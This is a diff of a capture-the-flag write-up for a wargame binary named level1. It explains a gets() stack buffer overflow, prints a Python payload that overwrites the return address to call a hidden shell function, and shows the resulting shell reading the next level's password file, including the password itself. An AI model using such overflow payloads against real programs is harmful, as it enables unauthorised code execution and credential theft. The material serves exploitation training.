@@ -1,5 +1,15 @@
+When we open the binary on GDB, we notice that the main functions try to read from stdin usig gets on a buffer.
+gets has a buffer overflow vulnerability, if we enter more than the buffer capacity the program will crash
+We also notice that the program contains a function run that opens the shell but it is not called,
+we will use buffer overflow to change the flow of the program so that it runs the function run using:
+
 python -c 'print "A"*76+"\x44\x84\x04\x08"' > /tmp/level1
-cat /tmp/level1 - | ./level1
+
+"\x44\x84\x04\x08" is the address of the function run (written in small endian notation)
+this address will override the return address and will make the program run the run function
+
+using the previous playload we can run the binary and get access to the level2 shell
+~$ cat /tmp/level1 - | ./level1
 Good... Wait what?
 cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
